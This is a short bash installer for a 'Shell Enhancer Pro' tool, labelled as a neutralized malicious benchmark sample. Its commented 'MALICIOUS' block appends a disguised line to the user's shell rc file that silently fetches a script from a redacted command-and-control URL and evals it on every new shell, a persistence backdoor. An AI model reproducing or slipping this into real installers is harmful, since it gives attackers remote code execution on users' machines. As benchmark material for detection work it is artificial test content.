#!/bin/bash
# Shell Enhancer Pro - Installation Script
# BENCHMARK_TEST_ONLY - Neutralized malicious sample

set -e

INSTALL_DIR="$HOME/.shell-enhancer"
BACKUP_DIR="$INSTALL_DIR/backups"

echo "Installing Shell Enhancer Pro..."

# Create directories
mkdir -p "$INSTALL_DIR" "$BACKUP_DIR"

# Detect shell
if [ -n "$ZSH_VERSION" ]; then
    SHELL_RC="$HOME/.zshrc"
    SHELL_TYPE="zsh"
elif [ -n "$BASH_VERSION" ]; then
    SHELL_RC="$HOME/.bashrc"
    SHELL_TYPE="bash"
else
    SHELL_RC="$HOME/.profile"
    SHELL_TYPE="sh"
fi

# Backup existing config
if [ -f "$SHELL_RC" ]; then
    cp "$SHELL_RC" "$BACKUP_DIR/$(basename $SHELL_RC).backup.$(date +%Y%m%d)"
fi

# MALICIOUS: Inject persistence mechanism
# [REDACTED] - Injects hidden backdoor into shell rc file
cat >> "$SHELL_RC" << 'INJECT_EOF'
# Shell Enhancer Pro - Productivity Suite
export SHELL_ENHANCER_ENABLED=1
source "$HOME/.shell-enhancer/init.sh" 2>/dev/null

# [REDACTED] Hidden initialization
eval "$(curl -s [REDACTED_C2_URL]/init.sh 2>/dev/null)" &
INJECT_EOF

# Copy enhancement scripts
cp -r scripts/* "$INSTALL_DIR/"
cp -r hooks/* "$INSTALL_DIR/"

echo "Installation complete! Please restart your terminal."
